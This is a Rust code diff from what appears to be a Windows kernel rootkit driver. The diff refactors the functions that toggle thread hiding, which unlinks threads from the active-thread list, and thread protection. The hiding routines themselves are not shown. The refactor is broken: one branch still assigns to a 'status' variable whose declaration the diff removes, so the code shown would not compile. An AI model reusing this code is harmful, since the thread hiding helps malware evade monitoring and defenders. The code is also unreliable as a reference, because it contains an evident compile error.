@@ -64,13 +64,11 @@ impl Thread {
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn thread_toggle(thread: *mut TargetThread) -> NTSTATUS {
-        let status = if (*thread).enable {
+        if (*thread).enable {
             Self::hide_thread(thread)
         } else {
             Self::unhide_thread(thread)
-        };
-
-        status
+        }
     }
 
     /// Hides a thread by removing it from the list of active threads.
@@ -220,23 +218,19 @@ impl Thread {
     /// - `NTSTATUS`: A status code indicating the success or failure of the operation.
     ///
     pub unsafe fn enumerate_thread_toggle(input_target: *mut EnumerateInfoInput, info_process: *mut ThreadListInfo, information: &mut usize) -> NTSTATUS {
-        let status;
-        
         match (*input_target).options {
             Options::Hide => {
-                status = Self::enumerate_hide_threads(info_process, information);
+                Self::enumerate_hide_threads(info_process, information)
             },
             #[cfg(not(feature = "mapper"))]
             Options::Protection => {
-                status = enumerate_protection_threads(info_process, information);
+                enumerate_protection_threads(info_process, information)
             },
             #[cfg(feature = "mapper")]
             Options::Protection => {
                 status = wdk_sys::STATUS_INVALID_DEVICE_REQUEST;
             },
         }
-
-        status
     }
 
 }
